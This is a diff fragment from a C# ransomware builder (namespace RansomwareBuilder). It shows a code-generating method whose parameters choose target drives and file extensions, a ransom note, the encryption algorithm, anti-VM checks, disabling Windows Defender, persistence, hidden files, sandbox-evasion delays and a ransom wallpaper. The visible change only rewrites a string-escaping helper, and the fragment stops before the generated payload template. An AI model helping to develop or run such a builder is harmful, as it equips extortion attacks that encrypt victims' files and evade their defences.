@@ -747,27 +747,31 @@ namespace RansomwareBuilder
         }
         
         private string GenerateCSharpCode(
-            string drives, string exts, string exclude, string include,
-            string encExt, string noteName, string noteContent,
-            string fakeName, int algo, int fakeEnabled, int hideEnabled,
-            int antiVM, int disableDefender, int persistence,
-            int hideFiles, int sandboxDelay,
-            string wallpaperBase64, string wallpaperExt)
-        {
-            // Экранирование для C# строки (без @)
-            string EscapeForCSharp(string s)
-            {
-                if (string.IsNullOrEmpty(s)) return "";
-                return s
-                    .Replace("\\", "\\\\")
-                    .Replace("\"", "\\\"")
-                    .Replace("\n", "\\n")
-                    .Replace("\r", "\\r")
-                    .Replace("\t", "\\t");
-            }
-            
-            // Экранирование для вставки в строку кода (без дополнительных преобразований)
-            string Esc(string s) => EscapeForCSharp(s);
+    string drives, string exts, string exclude, string include,
+    string encExt, string noteName, string noteContent,
+    string fakeName, int algo, int fakeEnabled, int hideEnabled,
+    int antiVM, int disableDefender, int persistence,
+    int hideFiles, int sandboxDelay,
+    string wallpaperBase64, string wallpaperExt)
+{
+    // Функция экранирования ДЛЯ ВСТАВКИ В КОД
+    string EscapeForCode(string s)
+    {
+        if (string.IsNullOrEmpty(s)) return "";
+        return s
+            .Replace("\\", "\\\\")
+            .Replace("\"", "\\\"")
+            .Replace("\n", "\\n")
+            .Replace("\r", "\\r")
+            .Replace("\t", "\\t")
+            .Replace("\0", "\\0")
+            .Replace("\a", "\\a")
+            .Replace("\b", "\\b")
+            .Replace("\f", "\\f")
+            .Replace("\v", "\\v");
+    }
+    
+    string Esc(string s) => EscapeForCode(s);
             
             return $@"
 using System;
